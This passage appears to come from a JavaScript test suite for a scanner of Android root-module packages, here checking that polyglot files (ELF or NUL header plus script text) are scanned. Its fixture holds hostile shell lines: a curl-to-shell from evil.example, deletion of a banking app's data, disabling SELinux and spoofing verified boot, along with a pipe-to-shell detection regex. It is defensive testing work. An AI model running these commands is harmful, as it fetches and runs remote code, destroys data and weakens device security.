  // 右半 `\|[^\n]*\b(?:sh|bash|…)\b`、`[^\n|]*` 那一段、severity/category/title/advice/anchor 都在 T3.3-C1 钉着，
  // 这里补的是本轮自己那两条：新前缀的形状与第二支的逐字节面。
  const pattern = RULES_BY_ID.PIPE_TO_SHELL.pattern.source;
  const leftPart = pattern.slice(0, pattern.indexOf('(?:curl|wget'));
  assert.ok(leftPart.startsWith('(?:^\\s*|[|;&`(]\\s*|'), `收缩后的第一支必须是左边界头：${pattern}`);
  assert.ok(pattern.includes('(?:^\\s*|[|;&`(]\\s*)(?:'), 'SHELL_STATEMENT_START 里那个本来就有的 ^\\s* 一支本轮不动（它必须还在原位原样）');
  assert.ok(pattern.includes('\\b(?:sh|bash|ash)\\s*<\\(\\s*(?:curl|wget)\\b'), '`<(` 第二支逐字节面一字未动（它没有前瞻）');
  assert.equal(RULES_BY_ID.PIPE_TO_SHELL.severity, 'high', 'severity 不动（工单 §2「不许动的」）');
  assert.equal(RULES_BY_ID.PIPE_TO_SHELL.anchor, 'anywhere', '锚点声明不动（闭包表继续按 x=1; 前缀验它）');
});



// ===========================================================================
// Task 4 —— polyglot（ELF 魔数 / 开头即 NUL，但整块可读）进 feed，不进 coveredSurface
// ===========================================================================
// 洞（工单 `briefs/task-4.md` §0，2026-10-15 在新 HEAD `3ff30a9` 上逐形重量过）：
//   `classify()` 第一道闸是 `detectBinary(f.head)`，命中就落 `binaries` 桶并 `continue` ——
//   「魔数/NUL 开头 + 后面整块是明文脚本」这种 polyglot **一行都没喂给内容规则**。
// 改前实测（本会话 `Temp/p5-t34/t4-probe4.mjs` / `t4-probe5.mjs` 逐形跑出来的值，不是抄工单）：
//   A1 形（ELF8 + 四行明文，ratio=0.965986）：直喂 scanContent 出 5 条
//     （PIPE_TO_SHELL/high@L2、RM_RF_MUTABLE/medium@L3、SELINUX_DISABLE/high@L4、
//       VERIFIED_BOOT_SPOOF/high@L5、NETWORK_FETCH/low@L2），而整包只有
//     `STRUCT_BINARY/medium` 一条，medium / block。
//   A2 形（NUL4 + 同一段明文，ratio=0.972028）：同上，detectBinary 走 NUL 那一支。
//   A3 三侧（0.851 / 0.850 / 0.849，比例是**精确**的 851/1000、850/1000、849/1000）：改前三条都是
//     medium / block、findings 只有 STRUCT_BINARY 一条 —— 改后只许 0.851 那一侧进面。
//   B1 形（Pixelify 两条 .descriptor 逐字节，0.875000 / 0.861524）：改前 medium / block、
//     counts={high:0,medium:2,low:0,info:0}、findings 就是那两条 STRUCT_BINARY；逐字节喂 scanContent 出 **0 条**。
//   B2 形（真字体前 3000 B，ratio=0.340333）：改前与改后都只许 STRUCT_BINARY 一条 —— 它不许进面。
//   B3 形（polyglot + `customize.sh` 里 `sh $MODPATH/assets/payload.bin`）：改前就是 high / block，
//     载荷因**引用升级**进面（Task 2.7 那条通道），EXEC_BUNDLED_FILE/high@customize.sh:2 在、
//     revokedBundledRefs=[] —— 这一格改前改后必须**一字不变**（工单 §2.5：撤销只认 coveredSurface）。
// 战果的口径（工单 §0 的诚实话）：本轮**不多拦一个包** —— `STRUCT_BINARY` 无条件发 medium，
// 带二进制的包本来就进不了自动通道；变的是报告从「有个二进制我读不了」变成「里面逐字写着什么、第几行」。
// 断言口径与 T3/T3.3/T3.4 相同：每条都 deepEqual 到**精确 findings 多重集合**，不写 some(...)。

// 共享层取值走**命名空间**而不是具名 import：先红阶段 `printableRatio` / `POLYGLOT_MIN_PRINTABLE`
// 还不存在，具名 import 会在链接期就把整个文件打挂（几百条一起红，拿不到「只有新用例红」这个数）。
import * as sharedT4 from './risk-rules.mjs';
import * as scanT4 from './scan.mjs';

/** 工单 §0 的量法，在夹具侧独立复算一份**只用来对账**（判据实现只许有共享层那一份，见 T4-C1）。 */
const T4_PRINTABLE = (b) => (b >= 0x20 && b <= 0x7e) || b === 0x09 || b === 0x0a || b === 0x0d;
const t4ratio = (bytes) => {
  const b = Buffer.isBuffer(bytes) ? bytes : Buffer.from(String(bytes ?? ''), 'utf8');
  if (!b.length) return 0;
  let ok = 0;
  for (const x of b) if (T4_PRINTABLE(x)) ok++;
  return ok / b.length;
};

const T4_SHA1 = (b) => createHash('sha1').update(b).digest('hex');
const T4_ELF8 = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
const T4_NUL4 = Buffer.from([0x00, 0x00, 0x00, 0x00]);
/** 五行明文（shebang + 管道 + rm -rf /data/... + setenforce 0 + resetprop verifiedbootstate） */
const T4_TXT = '#!/system/bin/sh\ncurl -s https://evil.example/a | sh\nrm -rf /data/data/com.bank.app\nsetenforce 0\nresetprop ro.boot.verifiedbootstate green\n';
/** 压线构造：分子=可打印字节数，分母=总字节数，尾部补 NUL。ELF8 头里恰好 3 个可打印（E、L、F）。 */
const t4edge = (printableTotal, total) => {
  const body = T4_TXT + '#'.repeat(printableTotal - 3 - Buffer.byteLength(T4_TXT));
  return Buffer.concat([T4_ELF8, Buffer.from(body, 'utf8'), Buffer.alloc(total - 8 - Buffer.byteLength(body), 0)]);
};
const T4_SHAPE = {
  a1: Buffer.concat([T4_ELF8, Buffer.from(T4_TXT, 'utf8')]),
  a2: Buffer.concat([T4_NUL4, Buffer.from(T4_TXT, 'utf8')]),
  in851: t4edge(851, 1000),
  eq850: t4edge(850, 1000),
  out849: t4edge(849, 1000),
  // 超限 polyglot：载荷整行落在 24 KB 之后（工单 §2.3 的有界通道就靠这一形记账）
  big: Buffer.concat([T4_ELF8,
    Buffer.from(pad29(LINES_BEFORE29 + 1) + 'setenforce 0\n' + pad29(60), 'utf8'),
    Buffer.alloc(64, 0)]),
};
const T4_SHA = {
  a1: '4993af34c77e7c53391388952a237daf360a64fd',
  a2: '5c5287d3e10dd22513f48e746ff90e834b010137',
  in851: '688e1044502a1c1abd241dacc47cf2260cd5be10',
  eq850: 'a2947b3711aa55a358d42e36a03bf02609f67e49',
  out849: '95995d4e122b4de1bf15e52f1cc9f9a5c6ad89c6',
  big: 'c99f986e50128e6a8f2bc7b03c32a00e36288fa8',
  descDnd: '1dc90e16ccab657ff3739be50c26d8cfbccaccfe',
  descMusic: '9460f9e423c0a095bee139e1704782093d5ec038',
  fontSlice: 'e9b3cbfbb9a7794b9d5d1373694e7f5cc17ddec3',
};

// —— 真样本逐字节（工单 §3 B1/B2 要的是「逐字节进包」，不是同比例的合成物）——
// 来源：Pixelify-master-source.zip 的 nplaying 固件描述文件、PerformanC_ReZygisk 的 webroot 字体前 3000 B。
// 只把字节请进夹具，样本包本身不参与测试运行；每条都用 sha1 钉住「贴进来的就是量过的那一份」。
const T4_B64 = {
  descDnd: [
    'EAAaWgpHY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9uX3RhcmdldHNbMF0uaW5pdGlhbF9zcXVlbGNoX3BlcmlvZF9mcmFt',
    'ZXMSBm1pbnQzMhgBIO+/vTwoBDAEGlsKR2NsYXNzaWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJnZXRzWzBdLm5lZ2F0aXZl',
    'X2V2ZW50X3RpbWVvdXRfZnJhbWVzEgdtdWludDMyGAAg77+9PCgEMAQaWQpGY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9u',
    'X3RhcmdldHNbMF0ubmVnYXRpdmVfZnJhbWVzX2JlZm9yZV9ldmVudBIGbWludDMyGAEg77+9PCgEMAQaVQpCY2xhc3NpZmllcl9k',
    'YXRhLmNsYXNzaWZpY2F0aW9uX3RhcmdldHNbMF0ubmVnYXRpdmVfc2NvcmVfdGhyZXNob2xkEgZtaW50MTYYASDvv708KAIwAhpb',
    'CkdjbGFzc2lmaWVyX2RhdGEuY2xhc3NpZmljYXRpb25fdGFyZ2V0c1swXS5wb3NpdGl2ZV9ldmVudF90aW1lb3V0X2ZyYW1lcxIH',
    'bXVpbnQzMhgAIO+/vTwoBDAEGlkKRmNsYXNzaWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJnZXRzWzBdLnBvc2l0aXZlX2Zy',
    'YW1lc19iZWZvcmVfZXZlbnQSBm1pbnQzMhgBIO+/vTwoBDAEGlUKQmNsYXNzaWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJn',
    'ZXRzWzBdLnBvc2l0aXZlX3Njb3JlX3RocmVzaG9sZBIGbWludDE2GAEg77+9PCgCMAIaWgpHY2xhc3NpZmllcl9kYXRhLmNsYXNz',
    'aWZpY2F0aW9uX3RhcmdldHNbMV0uaW5pdGlhbF9zcXVlbGNoX3BlcmlvZF9mcmFtZXMSBm1pbnQzMhgBIO+/vT0oBDAEGlsKR2Ns',
    'YXNzaWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJnZXRzWzFdLm5lZ2F0aXZlX2V2ZW50X3RpbWVvdXRfZnJhbWVzEgdtdWlu',
    'dDMyGAAg77+9PSgEMAQaWQpGY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9uX3RhcmdldHNbMV0ubmVnYXRpdmVfZnJhbWVz',
    'X2JlZm9yZV9ldmVudBIGbWludDMyGAEg77+9PCgEMAQaVQpCY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9uX3RhcmdldHNb',
    'MV0ubmVnYXRpdmVfc2NvcmVfdGhyZXNob2xkEgZtaW50MTYYASDvv708KAIwAhpbCkdjbGFzc2lmaWVyX2RhdGEuY2xhc3NpZmlj',
    'YXRpb25fdGFyZ2V0c1sxXS5wb3NpdGl2ZV9ldmVudF90aW1lb3V0X2ZyYW1lcxIHbXVpbnQzMhgAIO+/vT0oBDAEGlkKRmNsYXNz',
    'aWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJnZXRzWzFdLnBvc2l0aXZlX2ZyYW1lc19iZWZvcmVfZXZlbnQSBm1pbnQzMhgB',
    'IO+/vTwoBDAEGlUKQmNsYXNzaWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJnZXRzWzFdLnBvc2l0aXZlX3Njb3JlX3RocmVz',
    'aG9sZBIGbWludDE2GAEg77+9PCgCMAIaKwoYY2xhc3NpZmllcl9mcmFtZV9zdGVwX21zEgZtaW50MzIYASDvv70CKAQwBBodCgpt',
    'b2RlbF9uYW1lEgZjaGFyW10YACDvv70/KAEwARoiCg9tb2RlbF9uYW1lX3NpemUSBm1pbnQzMhgBIO+/vQIoBDAE',
  ].join(''),
  descMusic: [
    'EAAaVQpCY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9uX3RhcmdldHNbMF0uZ2VuZXJhdGVfbmVnYXRpdmVfZXZlbnRzEgZi',
    'b29sX3QYASDvv71kKAQwBBpaCkdjbGFzc2lmaWVyX2RhdGEuY2xhc3NpZmljYXRpb25fdGFyZ2V0c1swXS5pbml0aWFsX3NxdWVs',
    'Y2hfcGVyaW9kX2ZyYW1lcxIGbWludDMyGAEg77+9ZCgEMAQaWwpHY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9uX3Rhcmdl',
    'dHNbMF0ubmVnYXRpdmVfZXZlbnRfdGltZW91dF9mcmFtZXMSB211aW50MzIYACDvv71kKAQwBBpZCkZjbGFzc2lmaWVyX2RhdGEu',
    'Y2xhc3NpZmljYXRpb25fdGFyZ2V0c1swXS5uZWdhdGl2ZV9mcmFtZXNfYmVmb3JlX2V2ZW50EgZtaW50MzIYASDvv71kKAQwBBpV',
    'CkJjbGFzc2lmaWVyX2RhdGEuY2xhc3NpZmljYXRpb25fdGFyZ2V0c1swXS5uZWdhdGl2ZV9zY29yZV90aHJlc2hvbGQSBm1pbnQx',
    'NhgBIO+/vWQoAjACGlsKR2NsYXNzaWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJnZXRzWzBdLnBvc2l0aXZlX2V2ZW50X3Rp',
    'bWVvdXRfZnJhbWVzEgdtdWludDMyGAAg77+9ZCgEMAQaWQpGY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9uX3RhcmdldHNb',
    'MF0ucG9zaXRpdmVfZnJhbWVzX2JlZm9yZV9ldmVudBIGbWludDMyGAEg77+9ZCgEMAQaVQpCY2xhc3NpZmllcl9kYXRhLmNsYXNz',
    'aWZpY2F0aW9uX3RhcmdldHNbMF0ucG9zaXRpdmVfc2NvcmVfdGhyZXNob2xkEgZtaW50MTYYASDvv71kKAIwAhpZCkZjbGFzc2lm',
    'aWVyX2RhdGEuY2xhc3NpZmljYXRpb25fdGFyZ2V0c1swXS5wb3NpdGl2ZV9zdGF0ZV9pc19wZXJzaXN0ZW50EgZib29sX3QYASDv',
    'v71kKAQwBBorChhjbGFzc2lmaWVyX2ZyYW1lX3N0ZXBfbXMSBm1pbnQzMhgBIO+/vQMoBDAEGloKR2NsYXNzaWZpZXJfc3RhdGUu',
    'Y2xhc3NpZmljYXRpb25fdGFyZ2V0c1swXS5wb3NpdGl2ZV9zdGF0ZV9pc19wZXJzaXN0ZW50EgZib29sX3QYASDvv71kKAQwBBod',
    'Cgptb2RlbF9uYW1lEgZjaGFyW10YACDvv71lKAEwARoiCg9tb2RlbF9uYW1lX3NpemUSBm1pbnQzMhgBIO+/vQMoBDAEGhwKCXJl',
    'd2luZF9tcxIGbWludDMyGAEg77+9AygEMAQ=',
  ].join(''),
  fontSlice: [
    'AAEAAAANAO+/vQADAFBHREVGCRYJGQAAAVgAAABAR1BPUxdHIe+/vQAAIygAABPvv71HU1VC77+9J++/vS4AAFnvv70AACZ0T1Mv',
    'Mu+/ve+/vXfvv70AAAHvv70AAABgY21hcDUJOxQAAAHvv70AAALvv71nbHlmUcOS77+9AADvv70cAAHvv70CaGVhZBrvv70kYQAA',
    'ASAAAAA2aGhlYQx1BiAAAADvv70AAAAkaG10eGbvv73vv70xAAAS77+9AAAQ77+9bG9jYQsj77+977+9AAAKVAAACEhtYXhwBO+/',
    'vQEsAAAA77+9AAAAIG5hbWXvv70NFO+/vQAABO+/vQAABe+/vXBvc3Q677+9aO+/vQAANxAAACLvv70AAQAABCMA77+9AAwAdgAG',
    'AAEAAgAeAAYAAABkAAAAAwACAAEAAAQa77+977+9AGQJ77+977+977+977+9bgoHAAEAAAAAAAAAAAAAAAAAAAQiAAEAAAAEAQbv',
    'v73vv73vv71TXw8877+9AAMD77+9AAAAANik77+977+9AAAAAO+/vRY277+977+977+977+977+9CgcEKQAAAAcAAgAAAAAAAAAB',
    'AAAADAAAAAAAAAACAAgAGAAfAAMAIgAiAAMAeQB6AAMAfQB9AAMA77+9AO+/vQADAlwCXwADAmcCbAADAnMCcwADAAQDUwHvv70A',
    'BQAAAu+/vQJYAAAASwLvv70CWAAAAV4AMgFIAAAAAAUAAAAAAAAAAADvv70HAAAAAAAAAAAAAAAASVRGTwDvv70AAO+/vQIEGu+/',
    've+/vQBkBG8CcyAAAO+/vQAAAAACJALvv70AAAAgAAQAAAACAAAAAwAAABQAAwABAAAAFAAEAu+/vQAAAO+/vQDvv70ABgAaAAAA',
    'DQAgAH4BBwEbASMBMQE3AUgBWwFlAX4B77+9Ae+/vQHvv70CGwJZAu+/vQLvv70C77+9Au+/vQPvv70JAwkLCQ0JEQkUCSgJMAkz',
    'CTkJRQlJCU0JUAleCWUJbwlwCXIe77+9Hu+/vR7vv70e77+9IA0gFCAaIB4gIiAmIDAgOiBEIO+/vSDvv70g77+9IO+/vSETISIh',
    'JiEuIgIiBiIPIhIiFSIaIh4iKyJIImAiZSXvv70l77+977+9Au+/ve+/vQAAAAAADQAgACEA77+9AQoBHgEoATYBOQFMAV4BaAHv',
    'v70B77+9Ae+/vQIYAlkC77+9Au+/vQLvv70C77+9A++/vQkBCQUJDAkPCRMJFQkqCTEJNQk8CUcJSwlQCVgJYAlmCXAJch7vv70e',
    '77+9Hu+/vR7vv70gDCATIBggHCAgICYgMCA5IEQg77+9IO+/vSDvv70g77+9IRMhIiEmIS4iAiIGIg8iESIVIhkiHiIrIkgiYCJk',
    'Je+/vSXvv73vv70B77+977+9AAHvv73vv73vv73vv70CcwJSAlACTgJKAkYCRQJCAkACPgIuAiwB77+9Ae+/vQFsAQoBAQEAAO+/',
    'vQAQAADvv73vv70AAAAA77+977+977+9D++/vQ4AAO+/vQsAAAAAAADvv70577+977+9AADvv70Z77+9Gu+/ve+/ve+/vVHvv70b',
    '77+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+9QQAA77+9Mu+/',
    've+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/',
    've+/ve+/vTjvv73vv70JAgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAbgBwAAAA',
    'AAAAAG4AAABwAO+/vQDvv70AAAAAAO+/vQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAAAAAAAAAAAAA',
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB6AHkAewAMABIADgAPABQATwA/AEUAfgB8ABUAFgAXABgAGQAaABsAIgAeAB8A',
    'IwAgACEAfQALAA0AHAAdAO+/vQDvv70A77+9A++/vQAAAAAAEQDvv70AAwABBAkAAADvv70EFAADAAEECQABAA4EBgADAAEECQAC',
    'AA4D77+9AAMAAQQJAAMAPAPvv70AAwABBAkABAAeA++/vQADAAEECQAFAAoD77+9AAMAAQQJAAYAHgN2AAMAAQQJAAgAJgNQAAMA',
    'AQQJAAkAXALvv70AAwABBAkACwA6Au+/vQADAAEECQANASIB77+9AAMAAQQJAA4ANgFiAAMAAQQJABMA77+9AO+/vQADAAEECQEA',
    'AEAAdAADAAEECQEBAB4AVgADAAEECQECACoALAADAAEECQEDACwAAABBAGwAdABlAHIAbgBhAHQAaQB2AGUAIAAyACwAIAAzACwA',
    'IAA2ACwAIAA5AEEAbAB0AGUAcgBuAGEAdABpAHYAZQAgAGEAbQBwAGUAcgBzAGEAbgBkAEQAbwB1AGIAbABlAC0AcwB0AG8AcgBl',
    'AHkAIABhAFMAcQB1AGEAcgBlACAAZABvAHQAcwAgAGkAbgAgAHAAdQBuAGMAdAB1AGEAdABpAG8AbgAgAG0AYQByAGsAcwk4CS0J',
    'QAAgCS4JKAlBCTcJTQkvCUsJAgAgCRUJSwAgCRcJTAkwCTUAIAkUCTAAIAkFCScJPwkVCT4JMAlLCQIAIAkVCUcAIAkuCT4JLgky',
    'CUcAIAkuCUcJAgAgCRwJKAlNCS4JHAk+CSQAIAk4CU0JNQkkCSgJTQkkCU0JMAkkCT4AIAkUCTAAIAk4CS4JPgkoCSQJPgAgCSoJ',
    'TQkwCT4JKglNCSQAIAk5CUgJZABoAHQAdABwAHMAOgAvAC8AcwBjAHIAaQBwAHQAcwAuAHMAaQBsAC4AbwByAGcALwBPAEYATABU',
    'AGgAaQBzACAARgBvAG4AdAAgAFMAbwBmAHQAdwBhAHIAZQAgAGkAcwAgAGwAaQBjAGUAbgBzAGUAZAAgAHUAbgBkAGUAcgAgAHQA',
    'aABlACAAUwBJAEwAIABPAHAAZQBuACAARgBvAG4AdAAgAEwAaQBjAGUAbgBzAGUALAAgAFYAZQByAHMAaQBvAG4AIAAxAC4AMQAu',
    'ACAAVABoAGkAcwAgAGwAaQBjAGUAbgBzAGUAIABpAHMAIABhAHYAYQBpAGwAYQBiAGwAZQAgAHcAaQB0AGgAIABhACAARgBBAFEA',
    'IABhAHQAOgAgAGgAdAB0AHAAcwA6AC8ALwBzAGMAcgBpAHAAdABzAC4AcwBpAGwALgBvAHIAZwAvAE8ARgBMAGgAdAB0AHAAcwA6',
    'AC8ALwBpAG4AZABpAGEAbgB0AHkAcABlAGYAbwB1AG4AZAByAHkALgBjAG8AbQBOAGkAbgBhAGQAIABLAGEAbABlACAAKABEAGUA',
    'dgBhAG4AYQBnAGEAcgBpACkALAAgAEoAbwBuAG4AeQAgAFAAaQBuAGgAbwByAG4AIAAoAEwAYQB0AGkAbgApAEkAbgBkAGkAYQBu',
    'ACAAVAB5AHAAZQAgAEYAbwB1AG4AZAByAHkAUABvAHAAcABpAG4AcwAtAFIAZQBnAHUAbABhAHIANAAuADAAMAA0AFAAbwBwAHAA',
    'aQBuAHMAIABSAGUAZwB1AGwAYQByAEkAVABGAE8AOwAgAFAAbwBwAHAAaQBuAHMAIABSAGUAZwB1AGwAYQByADsAIAA0AC4AMAAw',
    'ADQAYgA4AFIAZQBnAHUAbABhAHIAUABvAHAAcABpAG4AcwBDAG8AcAB5AHIAaQBnAGgAdAAgADIAMAAyADAAIABUAGgAZQAgAFAA',
    'bwBwAHAAaQBuAHMAIABQAHIAbwBqAGUAYwB0ACAAQQB1AHQAaABvAHIAcwAgACgAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBi',
  ].join(''),
};
const T4_NAME = {
  descDnd: 'Pixelify-master/module/extras/nplaying/system/etc/firmware/dnd.descriptor',
  descMusic: 'Pixelify-master/module/extras/nplaying/system/etc/firmware/music_detector.descriptor',
  fontSlice: 'webroot/fonts/fontface.slice',
};
const t4real = (k) => {
  const b = Buffer.from(T4_B64[k], 'base64');
  assert.equal(T4_SHA1(b), T4_SHA[k], `${k} 的 base64 与主控量过的那一份不是同一字节面`);
  return b;
};

/** 整份报告收成「ruleId/severity@file:line」多重集合（排序，可 deepEqual）。 */
const t4all = (r) => r.findings.map((f) => `${f.ruleId}/${f.severity}@${f.file}:${f.line}`).sort();
/** 这一格本轮的新观测面：哪些 binaries 条目被追加进了内容扫描（feed）。 */
const t4fed = (r) => (r.polyglotFed || []).map((x) => x.name).sort();
const t4fedRow = (r, name) => (r.polyglotFed || []).find((x) => x.name === name) || null;
const T4_CLEAN_SERVICE = '#!/system/bin/sh\necho ok\n';
/** 一个 binaries 条目 + 一份干净的 service.sh：module.prop 由夹具自动补齐。 */
async function t4pkg(id, name, bytes, extra = []) {
  const zip = makeModuleZip({ id, files: [['service.sh', T4_CLEAN_SERVICE], [name, bytes], ...extra] });
  return scanToReport(zip, { changeType: 'first' });
}
/** 五桶清单 + 升级清单 + others 清单里，这个条目名出现的总次数（一份身份 = 只许在 binaries 里）。 */
function t4listAppearances(r, name) {
  const inv = r.inventory;
  return [inv.canonicalScripts, inv.otherScripts, inv.handlers, inv.props, inv.policyFiles, inv.escalated]
    .reduce((n, rows) => n + (rows || []).filter((x) => x.name === name).length, 0)
    + r.scripts.filter((x) => x.name === name).length
    + r.inventory.otherFiles.filter((x) => x === name).length;
}

// —— §3 正面 ——

test('T4-A1 正面（工单 §0 表第三行 / §3 A1）：ELF 魔数 + 五行明文 ⇒ 五条内容发现都在，STRUCT_BINARY 照旧在', async () => {
  assert.equal(T4_SHA1(T4_SHAPE.a1), T4_SHA.a1, '夹具字节面钉住');
  assert.equal(t4ratio(T4_SHAPE.a1).toFixed(6), '0.965986', '整块可打印比例（工单 §0 的量法）');
  assert.equal(detectBinary(T4_SHAPE.a1.subarray(0, 512)).id, 'ELF', 'detectBinary 走的是魔数那一支');
  const r = await t4pkg('eval.t4a1', 'assets/payload.bin', T4_SHAPE.a1);
  assert.deepEqual(t4all(r), [
    'NETWORK_FETCH/low@assets/payload.bin:2',
    'PIPE_TO_SHELL/high@assets/payload.bin:2',
    'RM_RF_MUTABLE/medium@assets/payload.bin:3',
    'SELINUX_DISABLE/high@assets/payload.bin:4',
    'STRUCT_BINARY/medium@assets/payload.bin:0',
    'VERIFIED_BOOT_SPOOF/high@assets/payload.bin:5',
  ], '改前只有 STRUCT_BINARY 一条（medium/block）；这六条就是本轮的战果本身');
  assert.deepEqual(r.counts, { high: 3, medium: 2, low: 1, info: 0 });
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
  // 工单 §3 A1 括号里那句：这不是重复账 —— STRUCT_BINARY 说「有二进制」，
  // 内容那五条说「里面逐字写着什么、第几行」。两条都得在，缺一个就是报告在说谎。
  assert.deepEqual(t3spots(r, 'STRUCT_BINARY'), ['assets/payload.bin:0/medium'], '二进制登记照旧在（checkBinaries 一字未动）');
  assert.deepEqual(t4fed(r), ['assets/payload.bin'], '它进的是 feed，报告要指名');
});

test('T4-A2 正面（工单 §3 A2）：NUL 开头 + 同一段明文 ⇒ 同样五条（detectBinary 的 NUL 那一支）', async () => {
  assert.equal(T4_SHA1(T4_SHAPE.a2), T4_SHA.a2, '夹具字节面钉住');
  assert.equal(t4ratio(T4_SHAPE.a2).toFixed(6), '0.972028');
  assert.equal(detectBinary(T4_SHAPE.a2.subarray(0, 512)).id, 'NUL', '走的是「开头即含 NUL，不是文本」那一支');
  const r = await t4pkg('eval.t4a2', 'assets/payload.bin', T4_SHAPE.a2);
  assert.deepEqual(t4all(r), [
    'NETWORK_FETCH/low@assets/payload.bin:2',
    'PIPE_TO_SHELL/high@assets/payload.bin:2',
    'RM_RF_MUTABLE/medium@assets/payload.bin:3',
    'SELINUX_DISABLE/high@assets/payload.bin:4',
    'STRUCT_BINARY/medium@assets/payload.bin:0',
    'VERIFIED_BOOT_SPOOF/high@assets/payload.bin:5',
  ], '改前同样是只有 STRUCT_BINARY 的 medium/block');
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
  assert.deepEqual(t4fed(r), ['assets/payload.bin']);
});

test('T4-A3 正面（工单 §3 A3）：压线两侧 0.851 / 0.850 / 0.849 —— 判据是 > 0.85，不是 >=', async () => {
  // 三条用同一段明文，只靠尾部补 NUL 调比例；比例是**精确**的 851/1000、850/1000、849/1000。
  assert.equal(t4ratio(T4_SHAPE.in851), 0.851);
  assert.equal(t4ratio(T4_SHAPE.eq850), 0.85, '0.850 那一侧落在阈值**上**（>= 与 > 的分水岭）');
  assert.equal(t4ratio(T4_SHAPE.out849), 0.849);
  const IN = ['NETWORK_FETCH/low@assets/edge.bin:2', 'PIPE_TO_SHELL/high@assets/edge.bin:2',
    'RM_RF_MUTABLE/medium@assets/edge.bin:3', 'SELINUX_DISABLE/high@assets/edge.bin:4',
    'STRUCT_BINARY/medium@assets/edge.bin:0', 'VERIFIED_BOOT_SPOOF/high@assets/edge.bin:5'];
  const OUT = ['STRUCT_BINARY/medium@assets/edge.bin:0'];
  const rin = await t4pkg('eval.t4a3in', 'assets/edge.bin', T4_SHAPE.in851);
  assert.deepEqual(t4all(rin), IN, '0.851 > 0.85 ⇒ 进面');
  assert.deepEqual(t4fed(rin), ['assets/edge.bin']);
  assert.equal(rin.riskLevel, 'high');
  // 反面那一格：0.849「没进扫描面」必须钉成可观测的反面，而不是只钉一个等级。
  const rout = await t4pkg('eval.t4a3out', 'assets/edge.bin', T4_SHAPE.out849);
  assert.deepEqual(t4all(rout), OUT, '0.849 没进面：内容规则一行都没读它（摘掉阈值 = 变异 M2，红在这一格与 B2）');
  assert.deepEqual(t4fed(rout), [], '未过阈值的条目不许出现在 feed 记账里');
  assert.deepEqual(rout.counts, { high: 0, medium: 1, low: 0, info: 0 }, '改前改后一字不变');
  assert.equal(rout.riskLevel, 'medium');
  assert.equal(rout.decision.action, 'block');
  // 阈值那一格本身：>= 会把 0.850 也捞进来 ⇒ 这一条专防「> 写成 >=」。
  const req = await t4pkg('eval.t4a3eq', 'assets/edge.bin', T4_SHAPE.eq850);
  assert.deepEqual(t4all(req), OUT, '恰好 0.850 不许进面（判据是严格大于）');
  assert.deepEqual(t4fed(req), [], '同上');
  assert.equal(t4ratio(t4real('descMusic')).toFixed(6), '0.861524', '真包最高那一侧（0.862）离 0.85 只有 0.0116 的余量');
});

test('T4-A4 正面（工单 §3 A4）：命中行号落在 polyglot 条目自己身上，不许漂到 service.sh 去作证', async () => {
  const r = await t4pkg('eval.t4a4', 'assets/payload.bin', T4_SHAPE.a1);
  for (const ruleId of ['PIPE_TO_SHELL', 'RM_RF_MUTABLE', 'SELINUX_DISABLE', 'VERIFIED_BOOT_SPOOF', 'NETWORK_FETCH']) {
    assert.deepEqual(t3spots(r, ruleId), [`assets/payload.bin:${{
      PIPE_TO_SHELL: 2, RM_RF_MUTABLE: 3, SELINUX_DISABLE: 4, VERIFIED_BOOT_SPOOF: 5, NETWORK_FETCH: 2,
    }[ruleId]}/${{ PIPE_TO_SHELL: 'high', RM_RF_MUTABLE: 'medium', SELINUX_DISABLE: 'high', VERIFIED_BOOT_SPOOF: 'high', NETWORK_FETCH: 'low' }[ruleId]}`],
      `${ruleId} 的落点必须是那个条目自己的行`);
  }
  assert.ok(!r.findings.some((f) => f.file === 'service.sh'), 'service.sh 只有 echo ok —— 漂到它那儿就是报告在编证人');
  const snip = Object.fromEntries(r.findings.filter((f) => f.file === 'assets/payload.bin' && f.ruleId !== 'STRUCT_BINARY')
    .map((f) => [`${f.ruleId}@${f.line}`, f.snippet]));
  assert.equal(snip['PIPE_TO_SHELL@2'], 'curl -s https://evil.example/a | sh');
  assert.equal(snip['SELINUX_DISABLE@4'], 'setenforce 0');
  assert.equal(snip['VERIFIED_BOOT_SPOOF@5'], 'resetprop ro.boot.verifiedbootstate',
    'VERIFIED_BOOT_SPOOF 的 snippet 是匹配段本身（值 `green` 不在匹配里），逐字钉住防渲染层改动');
});

// —— §3 反面 ——

test('T4-B1 反面（工单 §0 / §3 B1）：Pixelify 两条 .descriptor 逐字节进包 ⇒ 进面可观测，但新发现 0 条、等级结论一字不变', async () => {
  const dnd = t4real('descDnd'); const music = t4real('descMusic');
  assert.equal(dnd.length, 1416); assert.equal(music.length, 1076);
  assert.equal(t4ratio(dnd), 0.875); assert.equal(t4ratio(music).toFixed(6), '0.861524');
  const zip = makeModuleZip({ id: 'eval.t4b1', files: [
